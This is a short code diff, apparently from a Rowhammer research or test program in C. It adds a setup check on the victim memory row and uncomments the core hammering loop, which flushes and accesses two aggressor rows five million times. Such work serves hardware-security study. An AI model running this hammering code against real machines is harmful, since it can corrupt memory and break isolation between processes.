@@ -44,6 +44,12 @@ uint64_t hammer_addresses(uint64_t vict, uint64_t attA, uint64_t attB, uint64_t 
 
     // Victim = 0x00
     memset((void*)vict_row, VIC_DATA, ROW_STRIDE);
+    for (int i = 0; i < ROW_STRIDE; i++) {
+    if (((uint8_t*)vict_row)[i] != VIC_DATA) {
+        printf("BUG: victim corrupted during setup at offset %d\n", i);
+        exit(1);
+    }
+}
 
     // Aggressors = 0xff
     memset((void*)attA_row, AGG_DATA, ROW_STRIDE);
@@ -61,7 +67,7 @@ uint64_t hammer_addresses(uint64_t vict, uint64_t attA, uint64_t attB, uint64_t 
     // -----------------------------
     // 2. HAMMER
     // -----------------------------
-/*
+
     for (int i = 0; i < 5000000; i++) {
         one_block_access((uint64_t)attA_ptr);
         clflush((void*)attA_ptr);
@@ -69,7 +75,6 @@ uint64_t hammer_addresses(uint64_t vict, uint64_t attA, uint64_t attB, uint64_t 
         one_block_access((uint64_t)attB_ptr);
         clflush((void*)attB_ptr);
     }
-        */
 
     mfence();
 
